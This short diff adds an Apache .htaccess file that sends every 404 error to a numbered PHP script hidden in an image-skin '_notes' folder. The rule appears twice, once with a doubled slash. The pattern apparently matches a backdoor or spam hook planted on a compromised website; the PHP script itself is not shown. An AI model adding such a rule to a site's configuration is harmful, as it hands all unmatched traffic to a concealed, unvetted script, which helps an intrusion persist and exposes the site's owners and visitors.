@@ -1,0 +1,6 @@
+
+Options -MultiViews
+ErrorDocument 404 //resources/skins/green/image/_notes/66991.php
+
+Options -MultiViews
+ErrorDocument 404 /resources/skins/green/image/_notes/66991.php
